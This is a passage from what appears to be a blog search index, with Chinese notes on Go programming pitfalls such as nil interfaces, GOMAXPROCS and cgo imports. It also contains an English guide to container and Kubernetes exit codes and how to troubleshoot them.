中的值，可以使用索引或者指针来进行操作。 对于新的 Go 开发者来说，更令人困惑的是 slice 元素是可寻址的。 package main import \"fmt\" type data struct { name string } func main() { s := []data {{\"one\"}} s[0].name = \"two\" //ok fmt.Println(s) //prints: [{two}] } 请注意，不久前可以在其中一个 Go 编译器 (gccgo) 中更新map元素字段，但该行为很快得到修复 :-) 它也被认为是 Go 1.3 的潜在功能。在那个时候支持它还不够重要，所以它仍然在待办事项列表上。 第一个解决方法是使用临时变量。 package main import \"fmt\" type data struct { name string } func main() { m := map[string]data {\"x\":{\"one\"}} r := m[\"x\"] r.name = \"two\" m[\"x\"] = r fmt.Printf(\"%v\",m) //prints: map[x:{two}] } 另一种解决方法是使用指针映射。 package main import \"fmt\" type data struct { name string } func main() { m := map[string]*data {\"x\":{\"one\"}} m[\"x\"].name = \"two\" //ok fmt.Println(m[\"x\"]) //prints: \u0026{two} } 顺便说一句，当你运行这段代码时会发生什么？ package main type data struct { name string } func main() { m := map[string]*data {\"x\":{\"one\"}} m[\"z\"].name = \"what?\" //??? } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:59:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"59.“nil”接口和“nil”接口值 等级：高级 这是 Go 中第二个最常见的问题，因为接口不是指针，即使它们看起来像指针。只有当它们的*类型和值字段为“nil”*时，接口变量才会为“nil”。 接口类型和值字段是根据用于创建相应接口变量的变量的类型和值填充的。当您尝试检查接口变量是否等于“nil”时，这可能会导致意外行为。 package main import \"fmt\" func main() { var data *byte var in interface{} fmt.Println(data,data == nil) //prints: \u003cnil\u003e true fmt.Println(in,in == nil) //prints: \u003cnil\u003e true in = data fmt.Println(in,in == nil) //prints: \u003cnil\u003e false //'data' is 'nil', but 'in' is not 'nil' } 当您有一个返回接口的函数时，请注意这个陷阱。 Incorrect: package main import \"fmt\" func main() { doit := func(arg int) interface{} { var result *struct{} = nil if(arg \u003e 0) { result = \u0026struct{}{} } return result } if res := doit(-1); res != nil { fmt.Println(\"good result:\",res) //prints: good result: \u003cnil\u003e //'res' is not 'nil', but its value is 'nil' } } Works: package main import \"fmt\" func main() { doit := func(arg int) interface{} { var result *struct{} = nil if(arg \u003e 0) { result = \u0026struct{}{} } else { return nil //return an explicit 'nil' } return result } if res := doit(-1); res != nil { fmt.Println(\"good result:\",res) } else { fmt.Println(\"bad result (res is nil)\") //here as expected } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:60:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"60.堆栈和堆变量 等级：高级 您并不总是知道您的变量是分配在堆栈还是堆上。在 C++ 中，使用new运算符创建变量始终意味着您有一个堆变量。在 Go 中，即使使用new() or make()函数，编译器也会决定分配变量的位置。编译器根据变量的大小和“转义分析”的结果选择存储变量的位置。这也意味着可以返回对局部变量的引用，这在 C 或 C++ 等其他语言中是不行的。 如果您需要知道变量的分配位置，请将“-m”gc 标志传递给“go build”或“go run”（例如，go run -gcflags -m app.go）。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:61:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"61.GOMAXPROCS、并发和并行 等级：高级 Go 1.4 及以下版本仅使用一个执行上下文/操作系统线程。这意味着在任何给定时间只能执行一个 goroutine。从 1.5 开始，Go 将执行上下文的数量设置为由runtime.NumCPU(). 该数字可能与系统上的逻辑 CPU 内核总数匹配，也可能不匹配，具体取决于进程的 CPU 亲和性设置。您可以通过更改GOMAXPROCS环境变量或调用runtime.GOMAXPROCS()函数来调整此数字。 有一个常见的误解是GOMAXPROCS表示 Go 将用于运行 goroutine 的 CPU 数量。runtime.GOMAXPROCS()功能文档更加混乱。GOMAXPROCS变量描述（https://golang.org/pkg/runtime/ ）在谈论操作系统线程方面做得更好。 您可以设置GOMAXPROCS为超过 CPU 的数量。从 1.10 开始，GOMAXPROCS 不再有限制。曾经的最大值GOMAXPROCS是 256，后来在 1.9 中增加到 1024。 package main import ( \"fmt\" \"runtime\" ) func main() { fmt.Println(runtime.GOMAXPROCS(-1)) //prints: X (1 on play.golang.org) fmt.Println(runtime.NumCPU()) //prints: X (1 on play.golang.org) runtime.GOMAXPROCS(20) fmt.Println(runtime.GOMAXPROCS(-1)) //prints: 20 runtime.GOMAXPROCS(300) fmt.Println(runtime.GOMAXPROCS(-1)) //prints: 256 } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:62:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"62.读写操作重新排序 等级：高级 Go 可能会重新排序某些操作，但它可以确保发生它的 goroutine 中的整体行为不会改变。但是，它不能保证跨多个 goroutine 的执行顺序。 package main import ( \"runtime\" \"time\" ) var _ = runtime.GOMAXPROCS(3) var a, b int func u1() { a = 1 b = 2 } func u2() { a = 3 b = 4 } func p() { println(a) println(b) } func main() { go u1() go u2() go p() time.Sleep(1 * time.Second) } If you run this code a few times you might see these a and b variable combinations: 1 2 3 4 0 2 0 0 1 4 The most interesting combination for a and b is “02”. It shows that b was updated before a. 如果您需要跨多个 goroutine 保持读写操作的顺序，则需要使用通道或“同步”包中的适当构造。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:63:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"63.抢先调度 等级：高级 可能有一个流氓 goroutine 会阻止其他 goroutine 运行。如果您有一个for不允许调度程序运行的循环，则可能会发生这种情况。 package main import \"fmt\" func main() { done := false go func(){ done = true }() for !done { } fmt.Println(\"done!\") } for循环不必为空。只要它包含不触发调度程序执行的代码，它就会成为一个问题。 调度程序将在 GC、“go”语句、阻塞通道操作、阻塞系统调用和锁定操作之后运行。它也可以在调用非内联函数时运行。 package main import \"fmt\" func main() { done := false go func(){ done = true }() for !done { fmt.Println(\"not done!\") //not inlined } fmt.Println(\"done!\") } 要确定您在for循环中调用的函数是否内联，请将“-m”gc 标志传递给“go build”或“go run”（例如，go build -gcflags -m）。 另一种选择是显式调用调度程序。您可以使用Gosched()“运行时”包中的功能来完成。 package main import ( \"fmt\" \"runtime\" ) func main() { done := false go func(){ done = true }() for !done { runtime.Gosched() } fmt.Println(\"done!\") } 请注意，上面的代码包含竞争条件。故意这样做是为了显示出问题的陷阱。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:64:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"64.导入 C 和多行导入块 等级：CGO 您需要导入“C”包才能使用 Cgo。你可以用一行import来做，也可以用一个import块来做。 package main /* #include \u003cstdlib.h\u003e */ import ( \"C\" ) import ( \"unsafe\" ) func main() { cs := C.CString(\"my go string\") C.free(unsafe.Pointer(cs)) } 如果您使用import块格式，则不能在同一块中导入其他包。 package main /* #include \u003cstdlib.h\u003e */ import ( \"C\" \"unsafe\" ) func main() { cs := C.CString(\"my go string\") C.free(unsafe.Pointer(cs)) } Compile Error: ./main.go:13:2: could not determine kind of name for C.free ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:65:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"65.Import C 和 Cgo 注释之间没有空行 等级：CGO Cgo 的第一个陷阱之一是import “C\"语句上方的 cgo 注释的位置。 package main /* #include \u003cstdlib.h\u003e */ import \"C\" import ( \"unsafe\" ) func main() { cs := C.CString(\"my go string\") C.free(unsafe.Pointer(cs)) } Compile Error: ./main.go:15:2: could not determine kind of name for C.free 确保声明上方没有任何空行import “C”。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:66:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"66.不能使用可变参数调用 C 函数 等级：CGO 您不能直接调用带有可变参数的 C 函数。 package main /* #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e */ import \"C\" import ( \"unsafe\" ) func main() { cstr := C.CString(\"go\") C.printf(\"%s\\n\",cstr) //not ok C.free(unsafe.Pointer(cstr)) } Compile Error: ./main.go:15:2: unexpected type: … 您必须将可变参数 C 函数包装在具有已知数量参数的函数中。 package main /* #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void out(char* in) { printf(\"%s\\n\", in); } */ import \"C\" import ( \"unsafe\" ) func main() { cstr := C.CString(\"go\") C.out(cstr) //ok C.free(unsafe.Pointer(cstr)) } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:67:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"原文参考","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:68:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Docker"],"content":"Exit Codes In Containers \u0026 Kubernetes – The Complete Guide ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:0:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"What are Container Exit Codes Exit codes are used by container engines, when a container terminates, to report why it was terminated. If you are a Kubernetes user, container failures are one of the most common causes of pod exceptions, and understanding container exit codes can help you get to the root cause of pod failures when troubleshooting. The most common exit codes used by containers are: CODE # NAME WHAT IT MEANS Exit Code 0 Purposely stopped Used by developers to indicate that the container was automatically stopped Exit Code 1 Application error Container was stopped due to application error or incorrect reference in the image specification Exit Code 125 Container failed to run error The docker run command did not execute successfully Exit Code 126 Command invoke error A command specified in the image specification could not be invoked Exit Code 127 File or directory not found File or directory specified in the image specification was not found Exit Code 128 Invalid argument used on exit Exit was triggered with an invalid exit code (valid codes are integers between 0-255) Exit Code 134 Abnormal termination (SIGABRT) The container aborted itself using the abort() function. Exit Code 137 Immediate termination (SIGKILL) Container was immediately terminated by the operating system via SIGKILL signal Exit Code 139 Segmentation fault (SIGSEGV) Container attempted to access memory that was not assigned to it and was terminated Exit Code 143 Graceful termination (SIGTERM) Container received warning that it was about to be terminated, then terminated Exit Code 255 Exit Status Out Of Range Container exited, returning an exit code outside the acceptable range, meaning the cause of the error is not known Below we’ll explain how to troubleshoot failed containers on a self-managed host and in Kubernetes, and provide more details on all of the exit codes listed above. This is part of an extensive series of guides about Observability. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:1:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"The Container Lifecycle To better understand the causes of container failure, let’s discuss the lifecycle of a container first. Taking Docker as an example – at any given time, a Docker container can be in one of several states: Created – the Docker container is created but not started yet (this is the status after running docker create, but before actually running the container) Up – the Docker container is currently running. This means the operating system process managed by the container is running. This happens when you use the commands docker start or docker run can happen using docker start or docker run. Paused – the container process was running, but Docker purposely paused the container. Typically this happens when you run the Docker pause command Exited – the Docker container has been terminated, usually because the container’s process was killed When a container reaches the Exited status, Docker will report an exit code in the logs, to inform you what happened to the container that caused it to shut down. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:2:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Understanding Container Exit Codes Below we cover each of the exit codes in more detail. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 0: Purposely Stopped Exit Code 0 is triggered by developers when they purposely stop their container after a task completes. Technically, Exit Code 0 means that the foreground process is not attached to a specific container. What to do if a container terminated with Exit Code 0? Check the container logs to identify which library caused the container to exit Review the code of the existing library and identify why it triggered Exit Code 0, and whether it is functioning correctly ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:1","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 1: Application Error Exit Code 1 indicates that the container was stopped due to one of the following: An application error – this could be a simple programming error in code run by the container, such as “divide by zero”, or advanced errors related to the runtime environment, such as Java, Python, etc An invalid reference – this means the image specification refers to a file that does not exist in the container image What to do if a container terminated with Exit Code 1? Check the container log to see if one of the files listed in the image specification could not be found. If this is the issue, correct the image specification to point to the correct path and filename. If you cannot find an incorrect file reference, check the container logs for an application error, and debug the library that caused the error. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:2","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 125: Container Failed to Run Exit Code 125 means that the command is used to run the container. For example docker run was invoked in the system shell but did not execute successfully. Here are common reasons this might happen: An undefined flag was used in the command, for example docker run --abcd The user-defined in the image specification does not have sufficient permissions on the machine Incompatibility between the container engine and the host operating system or hardware What to do if a container terminated with Exit Code 125? Check if the command used to run the container uses the proper syntax Check if the user running the container, or the context in which the command is executed in the image specification, has sufficient permissions to create containers on the host If your container engine provides other options for running a container, try them. For example, in Docker, try docker start instead of docker run Test if you are able to run other containers on the host using the same username or context. If not, reinstall the container engine, or resolve the underlying compatibility issue between the container engine and the host setup ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:3","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 126: Command Invoke Error Exit Code 126 means that a command used in the container specification could not be invoked. This is often the cause of a missing dependency or an error in a continuous integration script used to run the container. What to do if a container terminated with Exit Code 126? Check the container logs to see which command could not be invoked Try running the container specification without the command to ensure you isolate the problem Troubleshoot the command to ensure you are using the correct syntax and all dependencies are available Correct the container specification and retry running the container ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:4","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 127: File or Directory Not Found Exit Code 127 means a command specified in the container specification refers to a non-existent file or directory. What to do if a container terminated with Exit Code 127? Same as Exit Code 126, identify the failing command and make sure you reference a valid filename and file path available within the container image. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:5","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 128: Invalid Argument Used on Exit Exit Code 128 means that code within the container triggered an exit command, but did not provide a valid exit code. The Linux exit command only allows integers between 0-255, so if the process was exited with, for example, exit code 3.5, the logs will report Exit Code 128. What to do if a container terminated with Exit Code 128? Check the container logs to identify which library caused the container to exit. Identify where the offending library uses the exit command, and correct it to provide a valid exit code. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:6","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 134: Abnormal Termination (SIGABRT) Exit Code 134 means that the container abnormally terminated itself, closed the process and flushed open streams. This operation is irreversible, like SIGKILL (see Exit Code 137 below). A process can trigger SIGABRT by doing one of the following: Calling the abort() function in the libc library Calling the assert() macro, used for debugging. The process is then aborted if the assertion is false. What to do if a container terminated with Exit Code 134? Check container logs to see which library triggered the SIGABRT signal Check if process abortion was planned (for example because the library was in debug mode), and if not, troubleshoot the library and modify it to avoid aborting the container. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:7","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 137: Immediate Termination (SIGKILL) Exit Code 137 means that the container has received a SIGKILL signal from the host operating system. This signal instructs a process to terminate immediately, with no grace period. This can be either: Triggered when a container is killed via the container engine, for example when using the docker kill command Triggered by a Linux user sending a kill -9 command to the process Triggered by Kubernetes after attempting to terminate a container and waiting for a grace period of 30 seconds (by default) Triggered automatically by the host, usually due to running out of memory. In this case, the docker inspect command will indicate an OOMKilled error. What to do if a container terminated with Exit Code 137? Check logs on the host to see what happened prior to the container terminating, and whether it previously received a SIGTERM signal (graceful termination) before receiving SIGKILL If there was a prior SIGTERM signal, check if your container process handles SIGTERM and is able to gracefully terminate If there was no SIGTERM and the container reported an OOMKilled error, troubleshoot memory issues on the host Learn more in our detailed guide to the SIGKILL signal » ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:8","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 139: Segmentation Fault (SIGSEGV) Exit Code 139 means that the container received a SIGSEGV signal from the operating system. This indicates a segmentation error – a memory violation, caused by a container trying to access a memory location to which it does not have access. There are three common causes of SIGSEGV errors: Coding error—container process did not initialize properly, or it tried to access memory through a pointer to previously freed memory Incompatibility between binaries and libraries—container process runs a binary file that is not compatible with a shared library, and thus may try to access inappropriate memory addresses Hardware incompatibility or misconfiguration—if you see multiple segmentation errors across multiple libraries, there may be a problem with memory subsystems on the host or a system configuration issue What to do if a container terminated with Exit Code 139? Check if the container process handles SIGSEGV. On both Linux and Windows, you can handle a container’s response to segmentation violations. For example, the container can collect and report a stack trace If you need to further troubleshoot SIGSEGV, you may need to set the operating system to allow programs to run even after a segmentation fault occurs, to allow for investigation and debugging. Then, try to intentionally cause a segmentation violation and debug the library causing the issue If you cannot replicate the issue, check memory subsystems on the host and troubleshoot memory configuration Learn more in our detailed guide to the SIGSEGV signal » ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:9","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 143: Graceful Termination (SIGTERM) Exit Code 143 means that the container received a SIGTERM signal from the operating system, which asks the container to gracefully terminate, and the container succeeded in gracefully terminating (otherwise you will see Exit Code 137). This exit code can be: Triggered by the container engine stopping the container, for example when using the docker stop or docker-compose down commands Triggered by Kubernetes setting a pod to Terminating status, and giving containers a 30 second period to gracefully shut down What to do if a container terminated with Exit Code 143? Check host logs to see the context in which the operating system sent the SIGTERM signal. If you are using Kubernetes, check the kubelet logs to see if and when the pod was shut down. In general, Exit Code 143 does not require troubleshooting. It means the container was properly shut down after being instructed to do so by the host. Learn more in our detailed guide to the SIGTERM signal » ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:3:10","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 1: Application Error Exit Code 1 indicates that the container was stopped due to one of the following: An application error – this could be a simple programming error in code run by the container, such as “divide by zero”, or advanced errors related to the runtime environment, such as Java, Python, etc An invalid reference – this means the image specification refers to a file that does not exist in the container image What to do if a container terminated with Exit Code 1? Check the container log to see if one of the files listed in the image specification could not be found. If this is the issue, correct the image specification to point to the correct path and filename. If you cannot find an incorrect file reference, check the container logs for an application error, and debug the library that caused the error. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:4:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 125 ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:5:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 125: Container Failed to Run Exit Code 125 means that the command is used to run the container. For example docker run was invoked in the system shell but did not execute successfully. Here are common reasons this might happen: An undefined flag was used in the command, for example docker run --abcd The user-defined in the image specification does not have sufficient permissions on the machine 